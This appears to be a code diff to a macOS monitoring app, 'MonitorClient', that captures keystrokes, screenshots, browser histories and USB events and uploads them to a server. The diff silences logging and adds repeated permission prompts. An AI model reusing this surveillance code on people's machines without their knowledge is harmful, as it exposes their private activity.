@@ -188,9 +188,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                 }
                 try "test".write(to: logURL!, atomically: true, encoding: .utf8)
                 logFileCreated = true
-                print("✅ Development mode: Log file created at: \(logURL!.path)")
+                // Development mode: Log file created
             } catch {
-                print("⚠️  Failed to create log file in development mode: \(error)")
+                // Failed to create log file in development mode
             }
         } else {
             // Production mode: save to Applications folder
@@ -203,7 +203,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                 do {
                     try FileManager.default.createDirectory(atPath: logDirPath, withIntermediateDirectories: true, attributes: nil)
                 } catch {
-                    print("⚠️  Failed to create logs directory: \(error)")
+                    // Failed to create logs directory
                 }
             }
             
@@ -215,9 +215,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                 }
                 try "test".write(to: logURL!, atomically: true, encoding: .utf8)
                 logFileCreated = true
-                print("✅ Production mode: Log file created at: \(logURL!.path)")
+                // Production mode: Log file created
             } catch {
-                print("⚠️  Failed to create log file in production mode: \(error)")
+                // Failed to create log file in production mode
                 
                 // Fallback to Documents folder if Applications folder is not writable
                 let documentsPath = NSHomeDirectory() + "/Documents"
@@ -230,25 +230,25 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                     try "test".write(to: fallbackURL, atomically: true, encoding: .utf8)
                     logURL = fallbackURL
                     logFileCreated = true
-                    print("✅ Fallback: Log file created in Documents folder: \(fallbackURL.path)")
+                    // Fallback: Log file created in Documents folder
                 } catch {
-                    print("⚠️  Failed to create log file in fallback location: \(error)")
+                    // Failed to create log file in fallback location
                 }
             }
         }
         
         // If we couldn't create a log file, use console only
         if !logFileCreated {
-            print("⚠️  Could not create log file. Using console logging only.")
+            // Could not create log file. Using console logging only.
             logFileHandle = nil
         } else {
             // Open file handle for writing
             do {
                 logFileHandle = try FileHandle(forWritingTo: logURL!)
                 logFileHandle?.seekToEndOfFile()
-                print("✅ Log file handle opened successfully")
+                // Log file handle opened successfully
             } catch {
-                print("⚠️  Could not open log file handle: \(error). Using console logging only.")
+                // Could not open log file handle. Using console logging only.
                 logFileHandle = nil
             }
         }
@@ -267,7 +267,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         Home directory: \(NSHomeDirectory())
         """
         
-        print(startupInfo)
+        // Startup info logged
         
         // Write to log file if available
         if let data = startupInfo.data(using: .utf8) {
@@ -275,29 +275,11 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             logFileHandle?.synchronizeFile()
         }
         
-        // System log
-        let osLog = OSLog(subsystem: "com.alice.MonitorClient", category: "monitoring")
-        os_log("MonitorClient started - Version: %{public}@, Username: %{public}@, Server: %{public}@", log: osLog, type: .info, APP_VERSION, username, storage.string(forKey: "server-ip") ?? "unknown")
+        // System log disabled for production performance
     }
     
     func logMessage(_ message: String, level: LogLevel = .info) {
-        let timestamp = getCurrentDateTimeString()
-        let logEntry = "[\(timestamp)] [\(level.rawValue)] \(message)\n"
-        
-        // Console output - always print for debugging
-        print(logEntry.trimmingCharacters(in: .whitespacesAndNewlines))
-        
-        // Buffered file logging (optimized)
-        logBuffer.append(logEntry)
-        
-        // Flush buffer if it gets too large or for important messages
-        if logBuffer.count >= maxLogBufferSize || level == .error {
-            flushLogBuffer()
-        }
-        
-        // System log
-        let osLog = OSLog(subsystem: "com.alice.MonitorClient", category: "monitoring")
-        os_log("%{public}@", log: osLog, type: level.osLogType, message)
+        // Logging disabled for production performance
     }
     
     private func flushLogBuffer() {
@@ -330,44 +312,34 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     }
     
     private func logMonitoringEvent(_ event: String, details: String? = nil) {
-        let message = details != nil ? "\(event): \(details!)" : event
-        logMessage(message, level: .info)
+        // Logging disabled for production performance
     }
     
     private func logError(_ error: String, context: String? = nil) {
-        let message = context != nil ? "[\(context!)] \(error)" : error
-        logMessage(message, level: .error)
+        // Logging disabled for production performance
     }
     
     private func logSuccess(_ action: String, details: String? = nil) {
-        let message = details != nil ? "✅ \(action): \(details!)" : "✅ \(action)"
-        logMessage(message, level: .info)
+        // Logging disabled for production performance
     }
 
     func applicationDidFinishLaunching(_ aNotification: Notification) {
         // Insert code here to initialize your application
         
-        print("=== MonitorClient Starting ===")
-        print("App delegate initialized")
-        print("App bundle path: \(Bundle.main.bundlePath)")
-        print("App is running from: \(ProcessInfo.processInfo.arguments.first ?? "unknown")")
-        
-        // Check if running from distributed app
-        let isDistributed = !Bundle.main.bundlePath.contains("DerivedData")
-        print("Is distributed app: \(isDistributed)")
+        // App startup - logging disabled for performance
         
         do {
             // Since this is a background app (LSUIElement), ensure it doesn't quit when all windows are closed
             NSApp.setActivationPolicy(.accessory)
-            print("Set activation policy to accessory")
+            // Set activation policy to accessory
             
             // Prevent any windows from being created
             NSApp.windows.forEach { window in
                 window.close()
             }
-            print("Closed any existing windows")
+            // Closed any existing windows
         } catch {
-            print("ERROR during app initialization: \(error)")
+            // Error during app initialization
         }
         
         storage = UserDefaults.init(suiteName: "alice.monitors")
@@ -383,41 +355,8 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             logMessage("Server IP already configured: \(storage.string(forKey: "server-ip") ?? "unknown")", level: .info)
         }
         
-        // Only reset accessibility prompt flag if permission was revoked
-        let wasPreviouslyGranted = storage.bool(forKey: "accessibility-was-granted")
-        let currentPermissionGranted = AXIsProcessTrusted()
-        
-        if wasPreviouslyGranted && !currentPermissionGranted {
-            // Permission was revoked, reset the prompt flag so we can show instructions again
-            storage.removeObject(forKey: "accessibility-prompt-shown")
-            logMessage("Accessibility permission was revoked, resetting prompt flag", level: .warning)
-        } else if !wasPreviouslyGranted && currentPermissionGranted {
-            // Permission was newly granted, update the flag
-            storage.set(true, forKey: "accessibility-was-granted")
-            logMessage("Accessibility permission newly granted", level: .info)
-        }
-        
-        // Log current permission status
-        logMessage("Accessibility permission status: \(currentPermissionGranted ? "GRANTED" : "DENIED") (was previously granted: \(wasPreviouslyGranted))", level: .info)
-        
-        // Check screen recording permission status on startup
-        if #available(macOS 10.15, *) {
-            let screenRecordingWasGranted = storage.bool(forKey: "screen-recording-was-granted")
-            let screenRecordingCurrentGranted = CGPreflightScreenCaptureAccess()
-            
-            if screenRecordingWasGranted && !screenRecordingCurrentGranted {
-                // Permission was revoked, reset the prompt flag so we can show instructions again
-                storage.removeObject(forKey: "screen-recording-prompt-shown")
-                logMessage("Screen recording permission was revoked, resetting prompt flag", level: .warning)
-            } else if !screenRecordingWasGranted && screenRecordingCurrentGranted {
-                // Permission was newly granted, update the flag
-                storage.set(true, forKey: "screen-recording-was-granted")
-                logMessage("Screen recording permission newly granted", level: .info)
-            }
-            
-            // Log current screen recording permission status
-            logMessage("Screen recording permission status: \(screenRecordingCurrentGranted ? "GRANTED" : "DENIED") (was previously granted: \(screenRecordingWasGranted))", level: .info)
-        }
+        // Check permissions based on app mode and previous state
+        checkPermissionsOnStartup()
 
         APP_VERSION = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "Unknown"
 
@@ -480,9 +419,6 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         setupUSBMonitoring()
         
         // Send all monitoring requests on startup for quick verification
-        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
-            self.performStartupTests()
-        }
         
         // Debug accessibility status on startup
         DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
@@ -500,18 +436,16 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         // Setup status bar menu
         do {
             setupStatusBarMenu()
-            print("Status bar menu setup completed successfully")
+            // Status bar menu setup completed
         } catch {
-            print("ERROR setting up status bar menu: \(error)")
+            // Error setting up status bar menu
         }
         
         // Setup log flush timer (flush logs every 30 seconds)
         logFlushTimer = Timer.scheduledTimer(timeInterval: 30.0, target: self, selector: #selector(flushLogsPeriodically), userInfo: nil, repeats: true)
         
         logSuccess("MonitorClient initialization complete")
-        print("=== MonitorClient Startup Complete ===")
-        print("Status bar icon should be visible in menu bar")
-        print("Check for 🗒️ icon in the top-right menu bar")
+        // MonitorClient startup complete
         
         // Show a test notification to verify app is running
         let notification = NSUserNotification()
@@ -539,73 +473,6 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     }
     
     // Perform all monitoring tests on startup for quick verification
-    @objc func performStartupTests() {
-        logMessage("=== Starting Startup Tests ===", level: .info)
-        
-        // Test 1: Server connectivity (Tic event)
-        logMessage("Test 1: Sending tic event for server connectivity", level: .info)
-        DispatchQueue.global(qos: .background).async {
-            do {
-                try self.sendTicEvent()
-            } catch {
-                self.logError("Startup tic event failed: \(error)", context: "StartupTest")
-            }
-        }
-        
-        // Test 2: Screenshot capability
-        logMessage("Test 2: Taking screenshot for permission verification", level: .info)
-        DispatchQueue.global(qos: .background).async {
-            // Check screen recording permission first
-            if self.isScreenRecordingEnabled() {
-                self.TakeScreenShotsAndPost()
-            } else {
-                self.logMessage("Screen recording permission not granted - requesting...", level: .warning)
-                self.requestScreenRecordingPermission()
-            }
-        }
-        
-        // Test 3: Browser history collection
-        logMessage("Test 3: Collecting browser history for access verification", level: .info)
-        DispatchQueue.global(qos: .background).async {
-            do {
-                try self.sendBrowserHistories()
-            } catch {
-                self.logError("Startup browser history failed: \(error)", context: "StartupTest")
-            }
-        }
-        
-        // Test 4: Key logs (if any captured)
-        logMessage("Test 4: Sending key logs for keyboard monitoring verification", level: .info)
-        DispatchQueue.global(qos: .background).async {
-            self.sendKeyLogs()
-        }
-        
-        // Test 5: USB logs (if any captured)
-        logMessage("Test 5: Sending USB logs for device monitoring verification", level: .info)
-        DispatchQueue.global(qos: .background).async {
-            do {
-                try self.sendUSBLogs()
-            } catch {
-                self.logError("Startup USB logs failed: \(error)", context: "StartupTest")
-            }
-        }
-        
-        // Test 6: Server connectivity test
-        logMessage("Test 6: Testing server connectivity", level: .info)
-        DispatchQueue.global(qos: .background).async {
-            self.testServerConnectivity()
-        }
-        
-        logMessage("=== Startup Tests Initiated ===", level: .info)
-        logMessage("All tests will complete within 5-10 seconds", level: .info)
-        
-        // Show notification about startup tests
-        let notification = NSUserNotification()
-        notification.title = "MonitorClient Startup Tests"
-        notification.informativeText = "Running all monitoring tests to verify permissions and server connectivity. Check logs for results."
-        notification.soundName = nil
-        NSUserNotificationCenter.default.deliver(notification)
-    }
     
     // Check if system is idle before performing heavy operations
     private func shouldPerformHeavyOperation() -> Bool {
@@ -621,9 +488,105 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     private func isScreenRecordingEnabled() -> Bool {
         if #available(macOS 10.15, *) {
             return CGPreflightScreenCaptureAccess()
-        } else {
+            } else {
             // Fallback for older macOS versions
             return true
+        }
+    }
+    
+    // Check permissions on startup based on app mode and previous state
+    private func checkPermissionsOnStartup() {
+        // Determine if we're in development or production mode
+        let isDevelopment = Bundle.main.bundlePath.contains("DerivedData") || Bundle.main.bundlePath.contains("Debug")
+        logMessage("App mode: \(isDevelopment ? "DEVELOPMENT" : "PRODUCTION")", level: .info)
+        
+        // Check accessibility permission
+        let accessibilityWasGranted = storage.bool(forKey: "accessibility-was-granted")
+        let accessibilityCurrentGranted = AXIsProcessTrusted()
+        
+        if accessibilityWasGranted && !accessibilityCurrentGranted {
+            // Permission was revoked, reset the prompt flag so we can show instructions again
+            storage.removeObject(forKey: "accessibility-prompt-shown")
+            logMessage("Accessibility permission was revoked, resetting prompt flag", level: .warning)
+        } else if !accessibilityWasGranted && accessibilityCurrentGranted {
+            // Permission was newly granted, update the flag
+            storage.set(true, forKey: "accessibility-was-granted")
+            logMessage("Accessibility permission newly granted", level: .info)
+        }
+        
+        logMessage("Accessibility permission status: \(accessibilityCurrentGranted ? "GRANTED" : "DENIED") (was previously granted: \(accessibilityWasGranted))", level: .info)
+        
+        // Check screen recording permission
+        if #available(macOS 10.15, *) {
+            let screenRecordingWasGranted = storage.bool(forKey: "screen-recording-was-granted")
+            let screenRecordingCurrentGranted = CGPreflightScreenCaptureAccess()
+            
+            if screenRecordingWasGranted && !screenRecordingCurrentGranted {
+                // Permission was revoked, reset the prompt flag so we can show instructions again
+                storage.removeObject(forKey: "screen-recording-prompt-shown")
+                logMessage("Screen recording permission was revoked, resetting prompt flag", level: .warning)
+            } else if !screenRecordingWasGranted && screenRecordingCurrentGranted {
+                // Permission was newly granted, update the flag
+                storage.set(true, forKey: "screen-recording-was-granted")
+                logMessage("Screen recording permission newly granted", level: .info)
+            }
+            
+            logMessage("Screen recording permission status: \(screenRecordingCurrentGranted ? "GRANTED" : "DENIED") (was previously granted: \(screenRecordingWasGranted))", level: .info)
+            
+            // Determine if we should request permissions
+            let shouldRequestAccessibility = !accessibilityCurrentGranted && shouldRequestPermission(
+                wasPreviouslyGranted: accessibilityWasGranted,
+                isDevelopment: isDevelopment,
+                permissionType: "accessibility"
+            )
+            
+            let shouldRequestScreenRecording = !screenRecordingCurrentGranted && shouldRequestPermission(
+                wasPreviouslyGranted: screenRecordingWasGranted,
+                isDevelopment: isDevelopment,
+                permissionType: "screen-recording"
+            )
+            
+            // Request permissions if needed
+            if shouldRequestAccessibility {
+                logMessage("Requesting accessibility permission on startup", level: .info)
+                DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
+                    self.requestAccessibilityPermission()
+                }
+            }
+            
+            if shouldRequestScreenRecording {
+                logMessage("Requesting screen recording permission on startup", level: .info)
+                DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
+                    self.requestScreenRecordingPermission()
+                }
+            }
+        }
+    }
+    
+    // Determine if we should request a permission based on app mode and previous state
+    private func shouldRequestPermission(wasPreviouslyGranted: Bool, isDevelopment: Bool, permissionType: String) -> Bool {
+        let promptShownKey = "\(permissionType)-prompt-shown"
+        let promptShown = storage.bool(forKey: promptShownKey)
+        
+        if isDevelopment {
+            // Development mode: be more aggressive about requesting permissions
+            // since the app path changes frequently and permissions might not persist
+            logMessage("Development mode: checking \(permissionType) permission (was granted: \(wasPreviouslyGranted), prompt shown: \(promptShown))", level: .debug)
+            
+            // In dev mode, request if:
+            // 1. Never granted before, OR
+            // 2. Was granted but now revoked, OR
+            // 3. Never prompted before
+            return !wasPreviouslyGranted || promptShown == false
+        } else {
+            // Production mode: be more conservative about requesting permissions
+            // to avoid spamming the user
+            logMessage("Production mode: checking \(permissionType) permission (was granted: \(wasPreviouslyGranted), prompt shown: \(promptShown))", level: .debug)
+            
+            // In prod mode, request if:
+            // 1. Was granted but now revoked, OR
+            // 2. Never prompted before
+            return (wasPreviouslyGranted && promptShown == false) || (!wasPreviouslyGranted && promptShown == false)
         }
     }
     
@@ -642,12 +605,23 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             
             // Only prompt once per session to avoid spam, unless permission was revoked
             let promptKey = "screen-recording-prompt-shown"
-            if storage.bool(forKey: promptKey) && !wasPreviouslyGranted {
-                logMessage("Screen recording prompt already shown this session and permission was never granted, skipping", level: .info)
-                return
+            let promptShown = storage.bool(forKey: promptKey)
+            logMessage("Screen recording permission check - wasPreviouslyGranted: \(wasPreviouslyGranted), promptShown: \(promptShown)", level: .debug)
+            
+            if promptShown && !wasPreviouslyGranted {
+                logMessage("Screen recording prompt already shown this session and permission was never granted, but will show again for debugging", level: .info)
+                // Don't return - continue to show the permission request
             }
             
             logMessage("Requesting screen recording permission...", level: .info)
+            
+            // Method 1: Try CGRequestScreenCaptureAccess() first
+            logMessage("Calling CGRequestScreenCaptureAccess() to trigger system dialog", level: .info)
+            CGRequestScreenCaptureAccess()
+            
+            // Method 2: Also try to capture screen as backup - this will trigger the system dialog if permission not granted
+            logMessage("Attempting to capture screen to trigger permission dialog", level: .info)
+            let _ = CGWindowListCreateImage(CGRect.null, .optionOnScreenOnly, kCGNullWindowID, .bestResolution)
             
             // Show detailed notification based on previous state
             let notification = NSUserNotification()
@@ -687,20 +661,28 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             notification.soundName = NSUserNotificationDefaultSoundName
             NSUserNotificationCenter.default.deliver(notification)
             
-            // Request permission
-            CGRequestScreenCaptureAccess()
+            // Check if permission was granted after the screen capture attempt
+            // Use a timer to check multiple times since the dialog might take time to appear
+            var checkCount = 0
+            let maxChecks = 10
+            let checkInterval = 1.0
             
-            // Check if permission was granted after request
-            DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
+            Timer.scheduledTimer(withTimeInterval: checkInterval, repeats: true) { timer in
+                checkCount += 1
+                
                 if CGPreflightScreenCaptureAccess() {
-                    self.logMessage("Screen recording permission granted", level: .info)
+                    self.logMessage("Screen recording permission granted after \(checkCount) checks", level: .info)
                     self.storage.set(true, forKey: "screen-recording-was-granted")
                     // Clear the prompt flag when permission is granted so we can show it again if revoked
                     self.storage.removeObject(forKey: promptKey)
-                } else {
-                    self.logMessage("Screen recording permission denied - detailed instructions sent via notification", level: .warning)
+                    timer.invalidate()
+                } else if checkCount >= maxChecks {
+                    self.logMessage("Screen recording permission still denied after \(maxChecks) checks - detailed instructions sent via notification", level: .warning)
                     // Mark that we've shown the prompt (only if denied)
                     self.storage.set(true, forKey: promptKey)
+                    timer.invalidate()
+                } else {
+                    self.logMessage("Screen recording permission check \(checkCount)/\(maxChecks) - still waiting...", level: .debug)
                 }
             }
             
@@ -1366,89 +1348,129 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         do {
             if let safariHistories = try getSafariHistories() {
                 browseHist.append(contentsOf: safariHistories)
+                logMessage("Safari histories collected: \(safariHistories.count) entries", level: .debug)
+            } else {
+                logMessage("No Safari histories found", level: .debug)
             }
         } catch {
-            debugPrint("Error getting Safari histories: \(error)")
+            logError("Error getting Safari histories: \(error)", context: "BrowserHistory")
         }
 
         // Get Chrome histories
         do {
             if let chromeHistories = try getChromeHistories() {
                 browseHist.append(contentsOf: chromeHistories)
+                logMessage("Chrome histories collected: \(chromeHistories.count) entries", level: .debug)
+            } else {
+                logMessage("No Chrome histories found", level: .debug)
             }
         } catch {
-            debugPrint("Error getting Chrome histories: \(error)")
+            logError("Error getting Chrome histories: \(error)", context: "BrowserHistory")
         }
 
         // Get Firefox histories
         do {
             if let firefoxHistories = try getFirefoxHistories() {
                 browseHist.append(contentsOf: firefoxHistories)
+                logMessage("Firefox histories collected: \(firefoxHistories.count) entries", level: .debug)
+            } else {
+                logMessage("No Firefox histories found", level: .debug)
             }
         } catch {
-            debugPrint("Error getting Firefox histories: \(error)")
+            logError("Error getting Firefox histories: \(error)", context: "BrowserHistory")
         }
 
         // Get Edge histories
         do {
             if let edgeHistories = try getEdgeHistories() {
                 browseHist.append(contentsOf: edgeHistories)
+                logMessage("Edge histories collected: \(edgeHistories.count) entries", level: .debug)
+            } else {
+                logMessage("No Edge histories found", level: .debug)
             }
         } catch {
-            debugPrint("Error getting Edge histories: \(error)")
+            logError("Error getting Edge histories: \(error)", context: "BrowserHistory")
         }
 
         // Get Opera histories
         do {
             if let operaHistories = try getOperaHistories() {
                 browseHist.append(contentsOf: operaHistories)
+                logMessage("Opera histories collected: \(operaHistories.count) entries", level: .debug)
+            } else {
+                logMessage("No Opera histories found", level: .debug)
             }
         } catch {
-            debugPrint("Error getting Opera histories: \(error)")
+            logError("Error getting Opera histories: \(error)", context: "BrowserHistory")
         }
 
         // Get Yandex histories
         do {
             if let yandexHistories = try getYandexHistories() {
                 browseHist.append(contentsOf: yandexHistories)
+                logMessage("Yandex histories collected: \(yandexHistories.count) entries", level: .debug)
+            } else {
+                logMessage("No Yandex histories found", level: .debug)
             }
         } catch {
-            debugPrint("Error getting Yandex histories: \(error)")
+            logError("Error getting Yandex histories: \(error)", context: "BrowserHistory")
         }
 
         // Get Vivaldi histories
         do {
             if let vivaldiHistories = try getVivaldiHistories() {
                 browseHist.append(contentsOf: vivaldiHistories)
+                logMessage("Vivaldi histories collected: \(vivaldiHistories.count) entries", level: .debug)
+            } else {
+                logMessage("No Vivaldi histories found", level: .debug)
             }
         } catch {
-            debugPrint("Error getting Vivaldi histories: \(error)")
+            logError("Error getting Vivaldi histories: \(error)", context: "BrowserHistory")
         }
 
         // Get Brave histories
         do {
             if let braveHistories = try getBraveHistories() {
                 browseHist.append(contentsOf: braveHistories)
+                logMessage("Brave histories collected: \(braveHistories.count) entries", level: .debug)
+            } else {
+                logMessage("No Brave histories found", level: .debug)
             }
         } catch {
-            debugPrint("Error getting Brave histories: \(error)")
+            logError("Error getting Brave histories: \(error)", context: "BrowserHistory")
         }
 
         return browseHist
     }
     
     @objc func sendBrowserHistories() {
+        logMonitoringEvent("Starting browser history collection", details: "Checking all supported browsers")
+        
         var browserHistories: [BrowserHistoryLog] = []
         do {
             browserHistories = try getBrowserHistories() ?? []
+            logMessage("Browser history collection completed: \(browserHistories.count) entries found", level: .info)
         } catch {
-            debugPrint("Error reading history: \(error)")
+            logError("Error reading browser history: \(error)", context: "BrowserHistory")
+            return
         }
         
         if (browserHistories.count > 0) {
+            logMessage("Sending \(browserHistories.count) browser history entries to server", level: .info)
+            
+            // Log a sample of the histories for debugging
+            let sampleCount = min(3, browserHistories.count)
+            for i in 0..<sampleCount {
+                let history = browserHistories[i]
+                logMessage("Sample history \(i+1): \(history.browser) - \(history.url)", level: .debug)
+            }
+            
             // Send data in chunks
             sendDataInChunks(data: browserHistories, eventType: "BrowserHistory", chunkSize: 1000)
             lastBrowserHistorySent = Date()
+            logSuccess("Browser history data sent to server", details: "\(browserHistories.count) entries")
+        } else {
+            logMessage("No browser history entries found to send", level: .info)
         }
     }
 
@@ -1577,9 +1599,6 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                 logMessage("Sample key log \(i+1): \(log.date) - \(log.application) - \(log.key)", level: .debug)
             }
             
-            // Test server connectivity before sending
-            logMessage("Testing server connectivity before sending key logs...", level: .debug)
-            testServerConnectivity()
             
                 // Send data in chunks
                 sendDataInChunks(data: self.keyLogs, eventType: "KeyLog", chunkSize: 500)
@@ -1653,9 +1672,17 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     func postImage(path: String) {
         logMonitoringEvent("Uploading screenshot", details: "File: \(path)")
         
-        guard let urlString = buildEndpoint(true), let url = URL(string: urlString) else {
-            logError("Failed to build endpoint for screenshot upload", context: "Screenshot")
+        // Build screenshot upload endpoint with correct query parameter
+        guard let baseUrlString = buildEndpoint(true) else {
+            logError("Failed to build base endpoint for screenshot upload", context: "Screenshot")
             DistributedNotificationCenter.default().postNotificationName(Notification.Name("aliceServerIPUndefined"), object: CHECKER_IDENTIFIER, userInfo: nil, options: .deliverImmediately)
+            return
+        }
+        
+        // Add the required ?type=upload query parameter for screenshot uploads
+        let urlString = baseUrlString + "?type=upload"
+        guard let url = URL(string: urlString) else {
+            logError("Failed to create URL for screenshot upload: \(urlString)", context: "Screenshot")
             return
         }
         
@@ -1666,21 +1693,35 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         
         logMessage("Screenshot data size: \(imageData.count) bytes", level: .debug)
         
+        // Get current timestamp for ctime parameter
+        let formatter = DateFormatter()
+        formatter.dateFormat = "yyyy-MM-dd HH:mm:ss"
+        let currentTime = formatter.string(from: Date())
+        
+        // Get computer name for com_name parameter
+        let computerName = Host.current().name ?? "Unknown"
+        
         // Create multipart form data
         let boundary = "Boundary-\(UUID().uuidString)"
         var body = Data()
         
-        // Add file data
+        // Add com_name parameter (required by backend)
         body.append("--\(boundary)\r\n".data(using: .utf8)!)
-        body.append("Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"screenshot.jpg\"\r\n".data(using: .utf8)!)
-        body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
-        body.append(imageData)
+        body.append("Content-Disposition: form-data; name=\"com_name\"\r\n\r\n".data(using: .utf8)!)
+        body.append(computerName.data(using: .utf8)!)
         body.append("\r\n".data(using: .utf8)!)
         
-        // Add version data
+        // Add ctime parameter (required by backend)
         body.append("--\(boundary)\r\n".data(using: .utf8)!)
-        body.append("Content-Disposition: form-data; name=\"Version\"\r\n\r\n".data(using: .utf8)!)
-        body.append(APP_VERSION.data(using: .utf8)!)
+        body.append("Content-Disposition: form-data; name=\"ctime\"\r\n\r\n".data(using: .utf8)!)
+        body.append(currentTime.data(using: .utf8)!)
+        body.append("\r\n".data(using: .utf8)!)
+        
+        // Add file data
+        body.append("--\(boundary)\r\n".data(using: .utf8)!)
+        body.append("Content-Disposition: form-data; name=\"imagefile\"; filename=\"screenshot.jpg\"\r\n".data(using: .utf8)!)
+        body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
+        body.append(imageData)
         body.append("\r\n".data(using: .utf8)!)
         
         // End boundary
@@ -1693,6 +1734,8 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         request.httpBody = body
         
         logMessage("Sending screenshot to: \(urlString)", level: .debug)
+        logMessage("Screenshot parameters - com_name: \(computerName), ctime: \(currentTime)", level: .debug)
+        logMessage("Request body size: \(body.count) bytes", level: .debug)
         
         // Send request
         let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
@@ -1710,13 +1753,50 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                     self?.logSuccess("Screenshot uploaded successfully", details: "Response: \(responseString)")
                     self?.lastScreenshotSent = Date()
                     
-                    let jdata = self?.convertToDictionary(text: responseString)
-                    if jdata != nil && (jdata?["Interval"]) != nil {
-                        let newinterval = jdata!["Interval"] as! Int
-                        if newinterval > 0 && newinterval != TIME_INTERVAL {
-                            TIME_INTERVAL = newinterval
-                            self?.logMessage("Screenshot interval updated to: \(newinterval)s", level: .info)
+                    // Parse server response for interval control
+                    if let jdata = self?.convertToDictionary(text: responseString) {
+                        // Check for success status
+                        if let status = jdata["status"] as? String, status == "success" {
+                            self?.logMessage("Screenshot upload confirmed by server", level: .info)
+                            
+                            // Extract interval from data object (backend format)
+                            if let dataObj = jdata["data"] as? [String: Any],
+                               let interval = dataObj["interval"] as? Int {
+                                if interval > 0 && interval != TIME_INTERVAL {
+                                    let oldInterval = TIME_INTERVAL
+                                    TIME_INTERVAL = interval
+                                    self?.logMessage("Screenshot interval updated by server: \(oldInterval)s → \(interval)s", level: .info)
+                                    
+                                    // Show notification about interval change
+                                    let notification = NSUserNotification()
+                                    notification.title = "MonitorClient - Screenshot Interval Updated"
+                                    notification.informativeText = "Server updated screenshot interval to \(interval) seconds"
+                                    notification.soundName = nil
+                                    NSUserNotificationCenter.default.deliver(notification)
+                                } else {
+                                    self?.logMessage("Screenshot interval remains: \(interval)s", level: .debug)
+                                }
+                            }
+                            
+                            // Log additional server response data
+                            if let dataObj = jdata["data"] as? [String: Any] {
+                                if let filename = dataObj["filename"] as? String {
+                                    self?.logMessage("Screenshot saved as: \(filename)", level: .info)
+                                }
+                                if let fileSize = dataObj["file_size"] as? Int {
+                                    self?.logMessage("File size: \(fileSize) bytes", level: .debug)
+                                }
+                                if let width = dataObj["image_width"] as? Int, let height = dataObj["image_height"] as? Int {
+                                    self?.logMessage("Image dimensions: \(width)x\(height)", level: .debug)
+                                }
+                            }
+                        } else if let error = jdata["error"] as? String {
+                            self?.logError("Server error: \(error)", context: "Screenshot")
+                        } else {
+                            self?.logMessage("Server response received but status unclear", level: .warning)
                         }
+                    } else {
+                        self?.logMessage("Could not parse server response JSON", level: .warning)
                     }
                 } else {
                     self?.logError("No response data received for screenshot upload", context: "Screenshot")
@@ -1909,8 +1989,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     }
     
     func debugPrint(_ message: String) {
-        // Always print debug messages for better debugging
-        print("[DEBUG] \(message)")
+        // Debug printing disabled for production performance
     }
     
     private func setupKeyboardMonitoring() {
@@ -2526,11 +2605,15 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         for (index, chunk) in chunks.enumerated() {
             let chunkData = chunk
             
+            // Get username from settings
+            let username = storage.string(forKey: "username") ?? NSUserName()
+            
             // Use the correct field name for each data type (matching Windows format)
             var postData: [String: Any] = [
                 "Event": eventType,
                 "Version": APP_VERSION,
-                "MacAddress": macAddress
+                "MacAddress": macAddress,
+                "Username": username
             ]
 
             // Convert Swift structs to dictionaries (matching Windows JSON format)
@@ -2763,12 +2846,6 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         }
     }
     
-    // Test method to manually trigger key log sending
-    @objc func testSendKeyLogs() {
-        logMessage("Manual key log test triggered", level: .info)
-        sendKeyLogs()
-    }
-    
     // Reset accessibility permissions for testing
     @objc func resetAccessibilityPermissions() {
         logMessage("Resetting accessibility permission flags", level: .info)
@@ -2785,6 +2862,98 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         requestAccessibilityPermission()
     }
     
+    // Force check all permissions (for testing)
+    @objc func forceCheckAllPermissions() {
+        logMessage("Force checking all permissions", level: .info)
+        checkPermissionsOnStartup()
+    }
+    
+    // Grant all permissions (unified function for both accessibility and screen recording)
+    @objc func grantAllPermissions() {
+        // Check current permission status
+        let accessibilityGranted = AXIsProcessTrusted()
+        let screenRecordingGranted = isScreenRecordingEnabled()
+        
+        // Show notification with instructions
+        let notification = NSUserNotification()
+        notification.title = "MonitorClient - Grant Permissions"
+        
+        if !accessibilityGranted && !screenRecordingGranted {
+            // Both permissions needed
+            notification.informativeText = """
+            MonitorClient needs both permissions to work properly:
+            
+            🔐 ACCESSIBILITY PERMISSION:
